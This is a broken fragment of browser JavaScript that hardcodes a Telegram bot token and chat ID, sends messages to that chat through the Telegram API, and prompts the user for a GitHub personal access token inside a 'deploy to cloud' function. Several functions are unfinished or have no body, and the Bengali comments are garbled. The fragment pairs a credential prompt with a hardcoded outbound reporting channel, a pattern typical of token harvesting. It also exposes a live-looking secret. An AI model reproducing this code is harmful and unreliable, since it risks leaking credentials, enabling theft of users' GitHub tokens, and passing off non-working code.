    const TELEGRAM_BOT_TOKEN = "7963725547:AAHDlM4f6L6w3V0L-H8R6tGof0U46iB6S-g";
    const TELEGRAM_CHAT_ID = "7154942953";

    function log(msg) {

    async function sendMsg(text) {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: "Markdown"
                })
            });
            if(response.ok) log("Telegram: Status Delivered.");
            else log("Telegram: Failed to send.");
        } catch (e) { log("Telegram: Network Error."); }
    }

    // ‡¶ï‡ßç‡¶≤‡¶æ‡¶â‡¶° ‡¶°‡ßá‡¶™‡ßç‡¶≤‡ßü‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶´‡¶ø‡¶ï‡ßç‡¶∏
    async function deployToCloud() {
        const link = document.getElementById('target').value;
        if(!link) return alert("Link is empty!");
        
        const userToken = prompt("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ GitHub Token ‡¶ü‡¶ø ‡¶¶‡¶ø‡¶® (ghp_...):");

    async function checkStatus(link) {
